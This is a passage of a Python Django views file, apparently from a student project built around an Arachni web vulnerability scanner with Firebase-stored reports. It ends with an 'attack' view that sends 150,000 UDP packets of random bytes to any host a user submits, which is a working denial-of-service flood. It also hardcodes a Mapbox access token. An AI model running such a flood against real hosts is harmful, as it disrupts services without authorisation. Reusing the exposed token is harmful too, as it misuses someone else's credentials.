    emel=login_email_rn.replace(".","_")
    extract = db.child(emel).child("scans").child(url_tofirebase).child("issues").get()
    

    for x in extract.each():
        if x.key()=="issues":
            keys.append("None")
            descr.append("None")
            remedy.append("None")
            url_issue.append("None")
            

        else:
            keys.append(x.key())
            descr.append(x.val()['description'])
            remedy.append(x.val()['remedy'])
            url_issue.append(x.val()['url_issue'])
  
    thisonetrust(fixed_scan_Id,email,re.sub('[.:/]','_',url),url)
    print("i passed")
    return render(request, 'report.html',{'data_arach':status_object["statistics"]["runtime"],"urlfirebase":url_inp,"keysNvalue":zip(keys,descr,remedy,url_issue)})
   

#@login_required
@csrf_exempt    
def arachni_auth (request):
    

    url = request.POST.get('param')
    username = request.POST.get('userInp')
    password = request.POST.get('passInp')

    if not re.match('(?:http|https)://', url):
        url='https://{}'.format(url)
    else:
        pass
    
    p=subprocess.Popen([r'D:\Desktop\FYP\FYP-Django\mysite\myapp\arachni-1.5.1-0.5.12-windows-x86_64\bin\arachni_rest_server.bat'])
    time.sleep(20)
    print(url)
    a = ArachniClient()
    resumeFlag = False
    authFlag = False

    #checks for existing scans and resumes from there instead
    avail_scan_object = a.get_scans() #returns json object of available scans
    print(a.get_scans()) #displays available scans | testing only

    for x in avail_scan_object: #check if avail scan is ongoing
        status_object = a.get_status(x)
        if(status_object["busy"] == True): #break and resume last scan if scan is still ongoing
            scan_ID = x
            resumeFlag = True
            start_time = time.time()
            break

    #authFlag = True
    print("Authenticated scan")
    a.startAuthScan()
    a.profile("./myapp/profiles/full_audit_auth.json")
    target_url = url
    
    try:
        urllib.request.urlopen(target_url)
        a.options["url"] = target_url
        a.options["plugins"]["autologin"]["url"] = target_url
        a.options["plugins"]["autologin"]["parameters"] = request.POST.get('form_cred_user')+"=" + username + "&" + request.POST.get('form_cred_pass')+"=" + password
    except urllib.request.HTTPError as e:
        print(e.code)

    scan_json_object = a.start_scan() #outputs json dictionary
    scan_ID = scan_json_object["id"]
    start_time = time.time()
    scanflag=True
    while scanflag is True:
    
        print("Resumed scan? | ", resumeFlag)
        print("Authenticated? | ", authFlag)
        print("The scan is ongoing...")
        
        status_object = a.get_status(scan_ID)
        print("Current page is: ", status_object["statistics"]["current_page"])
        print("Total audited pages are: ", status_object["statistics"]["audited_pages"])
        print("Total found pages are: ", status_object["statistics"]["found_pages"])
        print("Elapsed time is: ", status_object["statistics"]["runtime"])
        print("Current status is: ", status_object["status"])
        print("Current busy flag is: ", status_object["busy"])

        if(status_object["busy"] == False):
            print("Total scan time: ", status_object["statistics"]["runtime"])
            print("Scan has been completed, retrieving report...")
            a.getScanReport(scan_ID,"json") #output to json for database processing
            a.getScanReport(scan_ID,"html") #output to html for user ease of interaction
            a.processJSON(scan_ID) #print out choice information
            scanflag=False
        time.sleep(5) #delay status update to 1 minute per status request
        
    a.delete_scan(scan_ID) #comment this out if performing testing | deletes the scan after it is complete to prevent zombie processes
    
    
    return render(request, 'fullarachni_auth.html',{'data_arach':status_object["statistics"]["runtime"]})

def default_map(request):
    mapbox_access_token = 'pk.eyJ1IjoibWFzdGVyZWxhaGVlIiwiYSI6ImNrOWp0am43MTFtM3IzbHA0dzhuOHZiN3UifQ.kgIXiMoyl9tfKZcFys9b_Q'
    return render(request, 'default.html', {'mapbox_access_token': mapbox_access_token})


def attack(request):
    remoteServer2    = request.POST.get('param2')
    remoteServerIP2  = socket.gethostbyname(remoteServer2)
    sock2 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    bytes = random._urandom(1490)
    sent = 0
    port=80
    while sent<150000:
        sock2.sendto(bytes, (remoteServerIP2,port))
        sent = sent + 1
        port = port + 1
        print ("Sent %s packet to %s throught port:%s"%(sent,remoteServerIP2,port))
        if port == 65534:
            port = 1
    
